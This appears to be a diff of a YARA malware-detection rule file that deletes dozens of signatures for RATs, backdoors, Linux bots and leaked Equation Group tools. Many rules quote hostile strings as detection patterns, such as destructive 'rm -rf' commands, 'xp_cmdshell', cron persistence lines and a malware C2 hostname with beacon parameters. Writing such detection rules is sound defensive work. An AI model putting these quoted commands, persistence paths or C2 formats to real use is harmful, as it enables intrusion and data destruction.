-        hash5 = "8dddc744bbfcf215346c812aa569e49523996f73a1f22fe4e688084ce1225b98"
-        hash6 = "0c69258adcc97632b729e55664c22cd942812336d41e8ea0cff9ddcafaded20f"
-        hash7 = "2b4fba1ef06f85d1395945db40a9f2c3b3ed81b56fb9c2d5e5bb693c230215e2"
-        hash8 = "7206075cd8f1004e8f1f759d46e98bfad4098b8642412811a214c0155a1f08b9"
-        hash9 = "edb12790b5cd959bc2e53a4b369a4fd747153e6c9d50f6a69ff047f7857a4348"
-  
-    strings:
-        $x1 = "\\\\.\\pipe\\sdlrpc" fullword ascii
-        $x2 = "WaitMutex Abandoned %p" fullword ascii
-        $x3 = "OPER|Wrong config: no port|" fullword ascii
-        $x4 = "OPER|Wrong config: no lastconnect|" fullword ascii
-        $x5 = "OPER|Wrong config: empty address|" fullword ascii
-        $x6 = "Trans task %d obj %s ACTIVE fail robj %s" fullword ascii
-        $x7 = "OPER|Wrong config: no auth|" fullword ascii
-        $x8 = "OPER|Sniffer '%s' running... ooopppsss...|" fullword ascii
-        $s1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\User Agent\\Post Platform" fullword ascii
-        $s2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\5.0\\User Agent\\Pre Platform" fullword ascii
-        $s3 = "www.yahoo.com" fullword ascii
-        $s4 = "MSXIML.DLL" fullword wide
-        $s5 = "www.bing.com" fullword ascii
-        $s6 = "%s: http://%s%s" fullword ascii
-        $s7 = "/javascript/view.php" fullword ascii
-        $s8 = "Task %d failed %s,%d" fullword ascii
-        $s9 = "Mozilla/4.0 (compatible; MSIE %d.0; " fullword ascii
-   
-    condition:
-        ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) or 6 of ($s*) ) ) or ( 10 of them )
-}
-
 rule RUAG_Bot_Config_File 
 {
 
@@ -1788,30 +7894,6 @@ rule RUAG_Bot_Config_File
   
   condition:
     $s1 at 0 and $s2 and $s3 and filesize < 160 
-}
-
-rule Gh0st : RAT
-{
-    meta:
-        description = "Gh0st"
-	author = "botherder https://github.com/botherder"
-
-    strings:
-        $ = /(G)host/
-        $ = /(i)nflate 1\.1\.4 Copyright 1995-2002 Mark Adler/
-        $ = /(d)eflate 1\.1\.4 Copyright 1995-2002 Jean-loup Gailly/
-        $ = /(%)s\\shell\\open\\command/
-        $ = /(G)etClipboardData/
-        $ = /(W)riteProcessMemory/
-        $ = /(A)djustTokenPrivileges/
-        $ = /(W)inSta0\\Default/
-        $ = /(#)32770/
-        $ = /(#)32771/
-        $ = /(#)32772/
-        $ = /(#)32774/
-
-    condition:
-        all of them
 }
 
 rule Binary_Drop_Certutil
@@ -1849,43 +7931,6 @@ rule StegoKatz
    
     condition:
         filesize < 1000KB and 1 of them
-}
-
-rule moose
-{
-    meta:
-        Author      = "Thomas Dupuy"
-        Date        = "2015/04/21"
-        Description = "Linux/Moose malware"
-        Reference   = "http://www.welivesecurity.com/wp-content/uploads/2015/05/Dissecting-LinuxMoose.pdf"
-        Source = "https://github.com/eset/malware-ioc/"
-        Contact = "github@eset.com"
-        License = "BSD 2-Clause"
-
-    strings:
-        $s0 = "Status: OK"
-        $s1 = "--scrypt"
-        $s2 = "stratum+tcp://"
-        $s3 = "cmd.so"
-        $s4 = "/Challenge"
-        $s7 = "processor"
-        $s9 = "cpu model"
-        $s21 = "password is wrong"
-        $s22 = "password:"
-        $s23 = "uthentication failed"
-        $s24 = "sh"
-        $s25 = "ps"
-        $s26 = "echo -n -e "
-        $s27 = "chmod"
-        $s28 = "elan2"
-        $s29 = "elan3"
-        $s30 = "chmod: not found"
-        $s31 = "cat /proc/cpuinfo"
-        $s32 = "/proc/%s/cmdline"
-        $s33 = "kill %s"
-
-    condition:
-        is_elf and all of them
 }
 
 rule pony {
@@ -2022,55 +8067,6 @@ strings:
  	uint16(0) == 0x5a4d and filesize < 4MB and all of them
 }
 
-rule apt_nix_elf_derusbi
-{
-
-    meta:
-        Author = "@seifreed"
-
-    strings:
-        $ = "LxMain"
-        $ = "execve"
-        $ = "kill"
-        $ = "cp -a %s %s"
-        $ = "%s &"
-        $ = "dbus-daemon"
-        $ = "--noprofile"
-        $ = "--norc"
-        $ = "TERM=vt100"
-        $ = "/proc/%u/cmdline"
-        $ = "loadso"
-        $ = "/proc/self/exe"
-        $ = "Proxy-Connection: Keep-Alive"
-        $ = "Connection: Keep-Alive"
-        $ = "CONNECT %s"
-        $ = "HOST: %s:%d"
-        $ = "User-Agent: Mozilla/4.0"
-        $ = "Proxy-Authorization: Basic %s"
-        $ = "Server: Apache"
-        $ = "Proxy-Authenticate"
-        $ = "gettimeofday"
-        $ = "pthread_create"
-        $ = "pthread_join"
-        $ = "pthread_mutex_init"
-        $ = "pthread_mutex_destroy"
-        $ = "pthread_mutex_lock"
-        $ = "getsockopt"
-        $ = "socket"
-        $ = "setsockopt"
-        $ = "select"
-        $ = "bind"
-        $ = "shutdown"
-        $ = "listen"
-        $ = "opendir"
-        $ = "readdir"
-        $ = "closedir"
-        $ = "rename"
-
-    condition:
-        (uint32(0) == 0x4464c457f) and (all of them)
-}
-
 rule apt_nix_elf_Derusbi_Linux_Strings
 {
 
@@ -2151,32 +8147,6 @@ rule apt_win_exe_trojan_derusbi
 
    condition:
       (uint16(0) == 0x5A4D) and ( (all of ($sa_*)) or ((13 of ($sa_*)) and ( (5 of ($sb_*)) or (3 of ($sc_*)) or (all of ($sd_*)) or ( (1 of ($sc_*)) and (all of ($se_*)) ) ) ) )
-}
-
-rule derusbi_linux
-{
-
-    meta:
-        description = "Derusbi Server Linux version"
-        date = "2015-12-09"
-        author = "Airbus Defence and Space Cybersecurity CSIRT - Fabien Perigaud"
-
-    strings:
-        $PS1 = "PS1=RK# \\u@\\h:\\w \\$"
-        $cmd = "unset LS_OPTIONS;uname -a"
-        $pname = "[diskio]"
-        $rkfile = "/tmp/.secure"
-        $ELF = "\x7fELF"
-
-    condition:
-        $ELF at 0 and $PS1 and $cmd and $pname and $rkfile
-}
-
-rule fopo_obfuscator {
-    strings:
-        $ = "www.fopo.com.ar"
-    condition: 
-        any of them and filesize < 500KB
 }
 
 rule FiveEyes_QUERTY_Malwareqwerty_20121 
@@ -3328,36 +9298,6 @@ condition:
 uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 1 of ($variant*)
 }
 
-rule malware_red_leaves_generic {
-  meta:
-    author = "David Cannings"
-    description = "Red Leaves malware, related to APT10"
-    
-    // This hash from VT retrohunt, original sample was a memory dump
-    sha256 = "2e1f902de32b999642bb09e995082c37a024f320c683848edadaf2db8e322c3c"
-    
-  strings:
-    // MiniLZO release date
-    $ = "Feb 04 2015"
-    $ = "I can not start %s"
-    $ = "dwConnectPort" fullword
-    $ = "dwRemoteLanPort" fullword
-    $ = "strRemoteLanAddress" fullword
-    $ = "strLocalConnectIp" fullword
-    $ = "\\\\.\\pipe\\NamePipe_MoreWindows" wide
-    $ = "RedLeavesCMDSimulatorMutex" wide
-    $ = "(NT %d.%d Build %d)" wide
-    $ = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)" wide
-    $ = "red_autumnal_leaves_dllmain.dll" wide ascii
-    $ = "__data" wide
-    $ = "__serial" wide
-    $ = "__upt" wide
-    $ = "__msgid" wide
-    
-  condition:
-    7 of them
-}
-
 rule shimrat: RAT
 {
  meta:
@@ -3384,53 +9324,6 @@ rule shimrat: RAT
 
  condition:
   ($dll and $dat and $headersig and $datasig) or ($datamarker1 and $datamarker2) or ($cmdlineformat and $demoproject_keyword1 and $demoproject_keyword2 and $comspec) or ($dll and $dat and $shim_func1 and $shim_func2 and $shim_func3)
-}
-
-rule MALW_TinyShell_backconnect_OSX {
- meta:
-    date = "2018-02-10"
-    author = "@unixfreaxjp"
- condition:
-    is__osx
-    and priv01
-    and priv02
-    and priv03
-    and priv04
-    and filesize < 100KB
-}
-
-rule MALW_TinyShell_backconnect_ELF {
- meta:
-    date = "2018-02-10"
-    author = "@unixfreaxjp"
- condition:
-    is__elf
-    and priv01
-    and ((priv02)
-      or ((priv03)
-        or (priv04)))
-    and filesize < 100KB
-}
-
-rule MALW_TinyShell_backconnect_Gen {
- meta:
-    date = "2018-02-11"
-    author = "@unixfreaxjp"
- condition:
-    ((is__elf) or  (is__osx))
-    and priv01
-    and priv02
-    and filesize < 100KB
-}
-
-rule MALW_TinyShell_backdoor_Gen {
- meta:
-    date = "2018-02-11"
-    author = "@unixfreaxjp"
- condition:
-    ((is__elf) or  (is__osx))
-    and priv01
-    and filesize > 20KB
 }
 
 rule PoetRat_Python
@@ -3766,52 +9659,6 @@ condition:
         any of them
 }
 
-rule PLUGX_RedLeaves
-{
-meta:
-        author = "US-CERT Code Analysis Team"
-        date = "03042017"
-        incident = "10118538"
-        date = "2017/04/03"
-        MD5_1 = "598FF82EA4FB52717ACAFB227C83D474"
-        MD5_2 = "7D10708A518B26CC8C3CBFBAA224E032"
-        MD5_3 = "AF406D35C77B1E0DF17F839E36BCE630"
-        MD5_4 = "6EB9E889B091A5647F6095DCD4DE7C83"
-        MD5_5 = "566291B277534B63EAFC938CDAAB8A399E41AF7D"
-        info = "Detects specific RedLeaves and PlugX binaries"
-        reference = "https://www.us-cert.gov/ncas/alerts/TA17-117A"
-
-strings:
-        $s0 = { 80343057403D2FD0010072F433C08BFF80343024403D2FD0010072F4 }
-        $s1 = "C:/Users/user/Desktop/my_OK_2014/bit9/runsna/Release/runsna.pdb" fullword ascii
-        $s2 = "d:/work/plug4.0(shellcode)" fullword ascii
-        $s3 = "/shellcode/shellcode/XSetting.h" fullword ascii
-        $s4 = { 42AFF4276A45AA58474D4C4BE03D5B395566BEBCBDEDE9972872C5C4C5498228 }
-        $s5 = { 8AD32AD002D180C23830140E413BCB7CEF6A006A006A00566A006A00 }
-        $s6 = { EB055F8BC7EB05E8F6FFFFFF558BEC81ECC8040000535657 }
-        $s7 = { 8A043233C932043983C10288043283F90A7CF242890D18AA00103BD37CE2891514AA00106A006A006A0056 }
-        $s8 = { 293537675A402A333557B05E04D09CB05EB3ADA4A4A40ED0B7DAB7935F5B5B08 }
-        $s9 = "RedLeavesCMDSimulatorMutex"
-condition:
-        $s0 or $s1 or $s2 and $s3 or $s4 or $s5 or $s6 or $s7 or $s8 or $s9
-}
-
-rule is__str_mandibule_gen1 {
-	meta:
-		author = "unixfreaxjp"
-		date = "2018-05-31"
-	strings:
-		$str01 = "shared arguments too big" fullword nocase wide ascii
-		$str02 = "self inject pid: %" fullword nocase wide ascii
-		$str03 = "injected shellcode at 0x%lx" fullword nocase wide ascii        	
-		$str04 = "target pid: %d" fullword nocase wide ascii        	
-		$str05 = "mapping '%s' into memory at 0x%lx" fullword nocase wide ascii
-		$str06 = "shellcode injection addr: 0x%lx" fullword nocase wide ascii
-		$str07 = "loading elf at: 0x%llx" fullword nocase wide ascii
-	condition:
-                4 of them
-}
-
 rule OilRig_Malware_Campaign_Gen1 
 {
 
@@ -4045,40 +9892,6 @@ rule Powerkatz_DLL_Generic {
 		( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or 2 of them
 }
 
-rule QuarianStrings : Quarian Family
-{
-    meta:
-        description = "Quarian Identifying Strings"
-        author = "Seth Hardy"
-        last_modified = "2014-07-09"
-        
-    strings:
-        $ = "s061779s061750"
-        $ = "[OnUpLoadFile]"
-        $ = "[OnDownLoadFile]"
-        $ = "[FileTransfer]"
-        $ = "---- Not connect the Manager, so start UnInstall ----"
-        $ = "------- Enter CompressDownLoadDir ---------"
-        $ = "------- Enter DownLoadDirectory ---------"
-        $ = "[HandleAdditionalData]"
-        $ = "[mswsocket.dll]"
-        $ = "msupdate.dll........Enter ThreadCmd!"
-        $ = "ok1-1"
-        $ = "msupdate_tmp.dll"
-        $ = "replace Rpcss.dll successfully!"
-        $ = "f:\\loadhiddendriver-mdl\\objfre_win7_x86\\i386\\intelnat.pdb"
-        $ = "\\drivercashe\\" wide ascii
-        $ = "\\microsoft\\windwos\\" wide ascii
-        $ = "\\DosDevices\\LOADHIDDENDRIVER" wide ascii
-        $ = "\\Device\\LOADHIDDENDRIVER" wide ascii
-        $ = "Global\\state_maping" wide ascii
-        $ = "E:\\Code\\2.0\\2.0_multi-port\\2.0\\ServerInstall_New-2010-0913_sp3\\msupdataDll\\Release\\msupdate_tmp.pdb"
-        $ = "Global\\unInstall_event_1554_Ower" wide ascii
-        
-    condition:
-       any of them
-}
-
 rule apt_c16_win_disk_pcclient
 {
 
@@ -4111,28 +9924,6 @@ rule Misdat_Backdoor_Packed
         
     condition:
         filesize < 100KB and $upx and $send and $delphi_sec_pe and $shellexec
-}
-
-rule RemoteExec_Tool 
-{
-
-    meta:
-        description = "Remote Access Tool used in APT Terracotta"
-        author = "Florian Roth"
-        reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
-        date = "2015-08-04"
-        hash = "a550131e106ff3c703666f15d55d9bc8c816d1cb9ac1b73c2e29f8aa01e53b78"
-
-    strings:
-        $s0 = "cmd.exe /q /c \"%s\"" fullword ascii 
-        $s1 = "\\\\.\\pipe\\%s%s%d" fullword ascii 
-        $s2 = "This is a service executable! Couldn't start directly." fullword ascii 
-        $s3 = "\\\\.\\pipe\\TermHlp_communicaton" fullword ascii 
-        $s4 = "TermHlp_stdout" fullword ascii 
-        $s5 = "TermHlp_stdin" fullword ascii
-
-    condition:
-        uint16(0) == 0x5a4d and filesize < 75KB and 4 of ($s*)
 }
 
 rule EquationGroup_reverse_shell {
@@ -4437,90 +10228,6 @@ rule EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4 {
       ( uint16(0) == 0x457f and filesize < 50KB and all of them )
 }
 
-rule EquationGroup__ftshell {
-   meta:
-      description = "Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7"
-      author = "Florian Roth"
-      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
-      date = "2017-04-08"
-      super_rule = 1
-      hash1 = "9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893"
-      hash4 = "0be739024b41144c3b63e40e46bab22ac098ccab44ab2e268efc3b63aea02951"
-   strings:
-      $s1 = "if { [string length $uRemoteUploadCommand]" fullword ascii
-      $s2 = "processUpload" fullword ascii
-      $s3 = "global dothisreallyquiet" fullword ascii
-   condition:
-      ( uint16(0) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )
-}
-
-/*
-   Yara Rule Set
-   Author: Florian Roth
-   Date: 2017-04-09
-   Identifier: Equation Group hack tools leaked by ShadowBrokers
-*/
-
-/* Rule Set ----------------------------------------------------------------- */
-
-rule EquationGroup_store_linux_i386_v_3_3_0 {
-   meta:
-      description = "Equation Group hack tool set"
-      author = "Florian Roth"
-      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
-      date = "2017-04-09"
-      hash1 = "abc27fda9a0921d7cf2863c29768af15fdfe47a0b3e7a131ef7e5cc057576fbc"
-   strings:
-      $s1 = "[-] Failed to map file: %s" fullword ascii
-      $s2 = "[-] can not NULL terminate input data" fullword ascii
-      $s3 = "[!] Name has size of 0!" fullword ascii
-   condition:
-      ( uint16(0) == 0x457f and filesize < 60KB and all of them )
-}
-
-rule EquationGroup_morerats_client_genkey {
-   meta:
-      description = "Equation Group hack tool set"
-      author = "Florian Roth"
-      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
-      date = "2017-04-09"
-      hash1 = "0ce455fb7f46e54a5db9bef85df1087ff14d2fc60a88f2becd5badb9c7fe3e89"
-   strings:
-      $x1 = "rsakey_txt = lo_execute('openssl genrsa 2048 2> /dev/null | openssl rsa -text 2> /dev/null')" fullword ascii
-      $x2 = "client_auth = binascii.hexlify(lo_execute('openssl rand 16'))" fullword ascii
-   condition:
-      ( filesize < 3KB and all of them )
-}
-
-rule EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1 {
-   meta:
-      description = "Equation Group hack tool set"
-      author = "Florian Roth"
-      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
-      date = "2017-04-09"
-      hash1 = "614bf159b956f20d66cedf25af7503b41e91841c75707af0cdf4495084092a61"
-   strings:
-      $s1 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
-      $s2 = "0123456789abcdefABCEDF:" fullword ascii
-   condition:
-      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
-}
-
-rule EquationGroup_cursesleepy_mswin32_v_1_0_0 {
-   meta:
-      description = "Equation Group hack tool set"
-      author = "Florian Roth"
-      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
-      date = "2017-04-09"
-      hash1 = "6293439b4b49e94f923c76e302f5fc437023c91e063e67877d22333f05a24352"
-   strings:
-      $s1 = "A}%j,R" fullword ascii
-      $op1 = { a1 e0 43 41 00 8b 0d 34 44 41 00 6b c0 } /* Opcode */
-      $op2 = { 33 C0 F3 A6 74 14 8B 5D 08 8B 4B 34 50 } /* Opcode */
-   condition:
-      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
-}
-
 rule EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher {
    meta:
       description = "Detects EquationGroup Tool - April Leak"
@@ -4791,33 +10498,6 @@ rule custom_ssh_backdoor_server
         filesize < 10KB and 5 of them
 }
 
-rule T5000Strings : T5000 Family
-{
-    meta:
-        description = "T5000 Identifying Strings"
-        author = "Seth Hardy"
-        last_modified = "2014-06-26"
-        
-    strings:
-        $ = "_tmpR.vbs"
-        $ = "_tmpg.vbs"
-        $ = "Dtl.dat" wide ascii
-        $ = "3C6FB3CA-69B1-454f-8B2F-BD157762810E"
-        $ = "EED5CA6C-9958-4611-B7A7-1238F2E1B17E"
-        $ = "8A8FF8AD-D1DE-4cef-B87C-82627677662E"
-        $ = "43EE34A9-9063-4d2c-AACD-F5C62B849089"
-        $ = "A8859547-C62D-4e8b-A82D-BE1479C684C9"
-        $ = "A59CF429-D0DD-4207-88A1-04090680F714"
-        $ = "utd_CE31" wide ascii
-        $ = "f:\\Project\\T5000\\Src\\Target\\1 KjetDll.pdb"
-        $ = "l:\\MyProject\\Vc 7.1\\T5000\\T5000Ver1.28\\Target\\4 CaptureDLL.pdb"
-        $ = "f:\\Project\\T5000\\Src\\Target\\4 CaptureDLL.pdb"
-        $ = "E:\\VS2010\\xPlat2\\Release\\InstRes32.pdb"
-        
-    condition:
-       any of them
-}
-
 rule GoldenEye_Ransomware_XLS {
    meta:
       description = "GoldenEye XLS with Macro - file Schneider-Bewerbung.xls"
@@ -4895,41 +10575,6 @@ rule BlackEnergy_KillDisk_1
         uint16(0) == 0x5a4d and filesize < 500KB and 8 of them
 }
 
-rule is__LinuxHttpsdStrings {
-
-    meta:
-	description = "Strings of ELF Linux/Httpsd (backdoor, downloader, remote command execution)"
-	ref1 = "https://imgur.com/a/8mFGk"
-	ref2 = "https://otx.alienvault.com/pulse/5a49115f93199b171b90a212"
-	ref3 = "https://misppriv.circl.lu/events/view/9952"
-	author = "unixfreaxjp"
-	org = "MalwareMustDie"
-	date = "2018-01-02"
-	sha256 = "dd1266561fe7fcd54d1eb17efbbb6babaa9c1f44b36cef6e06052e22ce275ccd"
-	sha256 = "1b3718698fae20b63fbe6ab32411a02b0b08625f95014e03301b49afaee9d559"
-		
-	strings:
-		$st01 = "k.conectionapis.com" fullword nocase wide ascii
-		$st02 = "key=%s&host_name=%s&cpu_count=%d&os_type=%s&core_count=%s" fullword nocase wide ascii
-		$st03 = "id=%d&result=%s" fullword nocase wide ascii
-		$st04 = "rtime" fullword nocase wide ascii
-		$st05 = "down" fullword nocase wide ascii
-		$st06 = "cmd" fullword nocase wide ascii
-		$st07 = "0 */6 * * * root" fullword nocase wide ascii
-		$st08 = "/etc/cron.d/httpsd" fullword nocase wide ascii
-		$st09 = "cat /proc/cpuinfo |grep processor|wc -l" fullword nocase wide ascii
-		$st10 = "k.conectionapis.com" fullword nocase wide ascii
-		$st11 = "/api" fullword nocase wide ascii
-		$st12 = "/tmp/.httpslog" fullword nocase wide ascii
-		$st13 = "/bin/.httpsd" fullword nocase wide ascii
-		$st14 = "/tmp/.httpsd" fullword nocase wide ascii
-		$st15 = "/tmp/.httpspid" fullword nocase wide ascii
-		$st16 = "/tmp/.httpskey" fullword nocase wide ascii
-
-	condition:
-		all of them
-}
-
 rule TreasureHunt
   {
     meta:
@@ -4946,52 +10591,6 @@ rule TreasureHunt
 
     condition:
       all of them
-}
-
-rule clean_apt15_patchedcmd{
-	meta:
-		author = "Ahmed Zaki"
-		description = "This is a patched CMD. This is the CMD that RoyalCli uses."
-		reference = "https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/"
-		sha256 = "90d1f65cfa51da07e040e066d4409dc8a48c1ab451542c894a623bc75c14bf8f"
-	strings:
-	    $ = "eisableCMD" wide
-	    $ = "%WINDOWS_COPYRIGHT%" wide
-	    $ = "Cmd.Exe" wide
-	    $ = "Windows Command Processor" wide
-	condition:
-        	all of them
-}
-
-rule malware_apt15_royalcli_1{
-	meta:
-    description = "Generic strings found in the Royal CLI tool"
-    reference = "https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/"
-		author = "David Cannings"
-		sha256 = "6df9b712ff56009810c4000a0ad47e41b7a6183b69416251e060b5c80cd05785"
-
-	strings:
-	    $ = "%s~clitemp%08x.tmp" fullword
-	    $ = "qg.tmp" fullword
-	    $ = "%s /c %s>%s" fullword
-	    $ = "hkcmd.exe" fullword
-	    $ = "%snewcmd.exe" fullword
-	    $ = "%shkcmd.exe" fullword
-	    $ = "%s~clitemp%08x.ini" fullword
-	    $ = "myRObject" fullword
-	    $ = "myWObject" fullword
-	    $ = "10 %d %x\x0D\x0A"
-	    $ = "4 %s  %d\x0D\x0A"
-	    $ = "6 %s  %d\x0D\x0A"
-	    $ = "1 %s  %d\x0D\x0A"
-	    $ = "3 %s  %d\x0D\x0A"
-	    $ = "5 %s  %d\x0D\x0A"
-	    $ = "2 %s  %d 0 %d\x0D\x0A"
-	    $ = "2 %s  %d 1 %d\x0D\x0A"
-	    $ = "%s file not exist" fullword
-
-	condition:
-	    5 of them
 }
 
 rule malware_apt15_royalcli_2{
@@ -5022,27 +10621,6 @@ rule Adwind_JAR_PACKB : binary RAT Frutas Unrecom AlienSpy {
   $b1 = "java/textito.isn" ascii
  condition:
   int16(0) == 0x4B50 and ($c1 and $c2 and ($a1 or $b1))
-}
-
-rule KeyBoy_Backdoor
-{
-
-    meta:
-        Author      = "Rapid7 Labs"
-        Date        = "2013/06/07"
-        Description = "Strings inside"
-        Reference   = "https://community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-targeted-attacks-against-vietnam-and-india"
-
-    strings:
-        $1 = "$login$"
-        $2 = "$sysinfo$"
-        $3 = "$shell$"
-        $4 = "$fileManager$"
-        $5 = "$fileDownload$"
-        $6 = "$fileUpload$"
-
-    condition:
-        all of them
 }
 
 rule Stuxnet_Malware_3 
@@ -5356,27 +10934,6 @@ rule IronTiger_Gh0stRAT_variant
         uint16(0) == 0x5a4d and (any of ($str*))
 }
 
-rule IronTiger_wmiexec
-{
-  
-    meta:
-        author = "Cyber Safety Solutions, Trend Micro"
-        description = "Iron Tiger Tool - wmi.vbs detection"
-        reference = "http://goo.gl/T5fSJC"
-  
-    strings:
-        $str1 = "Temp Result File , Change it to where you like" nocase wide ascii
-        $str2 = "wmiexec" nocase wide ascii
-        $str3 = "By. Twi1ight" nocase wide ascii
-        $str4 = "[both mode] ,delay TIME to read result" nocase wide ascii
-        $str5 = "such as nc.exe or Trojan" nocase wide ascii
-        $str6 = "+++shell mode+++" nocase wide ascii
-        $str7 = "win2008 fso has no privilege to delete file" nocase wide ascii
-  
-    condition:
-        2 of ($str*)
-}
-
 rule IronPanda_DNSTunClient 
 {
 
@@ -5422,54 +10979,6 @@ rule IronPanda_Webshell_JSP
   
     condition:
         filesize < 330KB and 1 of them
-}
-
-rule NetTravStrings : NetTraveler Family {
-
-
-	meta:
-        	description = "Identifiers for NetTraveler DLL"
-		author = "Katie Kleemola"
-        	last_updated = "2014-05-20"
-
-	strings:
-		//network strings
-		$ = "?action=updated&hostid="
-		$ = "travlerbackinfo"
-		$ = "?action=getcmd&hostid="
-		$ = "%s?action=gotcmd&hostid="
-		$ = "%s?hostid=%s&hostname=%s&hostip=%s&filename=%s&filestart=%u&filetext="
-
-		//debugging strings
-		$ = "\x00Method1 Fail!!!!!\x00"
-		$ = "\x00Method3 Fail!!!!!\x00"
-		$ = "\x00method currect:\x00"
-		$ = /\x00\x00[\w\-]+ is Running!\x00\x00/
-		$ = "\x00OtherTwo\x00"
-
-	condition:
-		any of them
-
-}
-
-rule is__str_Rebirth_gen3 {
-	meta:
-		description = "Generic detection for Vulcan branch Rebirth or Katrina from Torlus nextgen"
-		reference = "https://imgur.com/a/SSKmu"
-		reference = "https://www.reddit.com/r/LinuxMalware/comments/7rprnx/vulcan_aka_linuxrebirth_or_katrina_variant_of/"
-		author = "unixfreaxjp"
-		org = "MalwareMustDie"
-		date = "2018-01-21"
-	strings:
-        	$str01 = "/usr/bin/python" fullword nocase wide ascii
-        	$str02 = "nameserver 8.8.8.8\nnameserver 8.8.4.4\n" fullword nocase wide ascii
-        	$str03 = "Telnet Range %d->%d" fullword nocase wide ascii
-        	$str04 = "Mirai Range %d->%d" fullword nocase wide ascii
-        	$str05 = "[Updating] [%s:%s]" fullword nocase wide ascii
-        	$str06 = "rm -rf /tmp/* /var/* /var/run/* /var/tmp/*" fullword nocase wide ascii
-		$str07 = "\x1B[96m[DEVICE] \x1B[97mConnected" fullword nocase wide ascii
-	condition:
-        	4 of them
 }
 
 rule scanarator {
@@ -6097,24 +11606,6 @@ rule CN_Toolset_NTscan_PipeCmd {
 		4 of them
 }
 
-rule CN_Toolset_sig_1433_135_sqlr {
-	meta:
-		description = "Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe"
-		author = "Florian Roth"
-		reference = "http://qiannao.com/ls/905300366/33834c0c/"
-		reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
-		date = "2015/03/30"
-		score = 70
-		hash = "8542c7fb8291b02db54d2dc58cd608e612bfdc57"
-	strings:
-		$s0 = "Connect to %s MSSQL server success. Type Command at Prompt." fullword ascii
-		$s11 = ";DATABASE=master" fullword ascii
-		$s12 = "xp_cmdshell '" fullword ascii
-		$s14 = "SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver" ascii
-	condition:
-		all of them
-}
-
 rule VSSown_VBS {
 	meta:
 		description = "Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere"
@@ -6321,20 +11812,6 @@ rule Payload_Exe2Hex : toolkit {
 		$d2 = "echo+r+cx+%3E%3E" ascii
 	condition:
 		all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*)
-}
-
-rule hatman_compiled_python : hatman {
-    condition:
-        filesize < 100KB and hatman_nullsub and hatman_setstatus and hatman_dividers
-}
-
-rule hatman : hatman {
-    meta:
-        author = "DHS/NCCIC/ICS-CERT"
-        description = "Matches the known samples of the HatMan malware."
-    condition:
-        filesize < 100KB and hatman_compiled_python or hatman_injector or hatman_payload
-            or hatman_combined
 }
 
 rule PlugXStrings : PlugX Family
@@ -7815,75 +13292,6 @@ rule APT1_WARP
 
     condition:
         2 of ($err*) and all of ($exe*)
-}
-
-rule APT1_TARSIP_MOON
-{
-
-    meta:
-        author = "AlienVault Labs"
-        info = "CommentCrew-threat-apt1"
-        
-    strings:
-        $s1 = "\\XiaoME\\SunCloud-Code\\moon" wide ascii
-        $s2 = "URL download success!" wide ascii
-        $s3 = "Kugoosoft" wide ascii
-        $msg1 = "Modify file failed!! So strange!" wide ascii
-        $msg2 = "Create cmd process failed!" wide ascii
-        $msg3 = "The command has not been implemented!" wide ascii
-        $msg4 = "Runas success!" wide ascii
-        $onec1 = "onec.php" wide ascii
-        $onec2 = "/bin/onec" wide ascii
-
-    condition:
-        1 of ($s*) and 1 of ($msg*) and 1 of ($onec*)
-}
-
-rule APT1_payloads
-{
-
-    meta:
-        author = "AlienVault Labs"
-        info = "CommentCrew-threat-apt1"
-
-    strings:
-        $pay1 = "rusinfo.exe" wide ascii
-        $pay2 = "cmd.exe" wide ascii
-        $pay3 = "AdobeUpdater.exe" wide ascii
-        $pay4 = "buildout.exe" wide ascii
-        $pay5 = "DefWatch.exe" wide ascii
-        $pay6 = "d.exe" wide ascii
-        $pay7 = "em.exe" wide ascii
-        $pay8 = "IMSCMig.exe" wide ascii
-        $pay9 = "localfile.exe" wide ascii
-        $pay10 = "md.exe" wide ascii
-        $pay11 = "mdm.exe" wide ascii
-        $pay12 = "mimikatz.exe" wide ascii
-        $pay13 = "msdev.exe" wide ascii
-        $pay14 = "ntoskrnl.exe" wide ascii
-        $pay15 = "p.exe" wide ascii
-        $pay16 = "otepad.exe" wide ascii
-        $pay17 = "reg.exe" wide ascii
-        $pay18 = "regsvr.exe" wide ascii
-        $pay19 = "runinfo.exe" wide ascii
-        $pay20 = "AdobeUpdate.exe" wide ascii
-        $pay21 = "inetinfo.exe" wide ascii
-        $pay22 = "svehost.exe" wide ascii
-        $pay23 = "update.exe" wide ascii
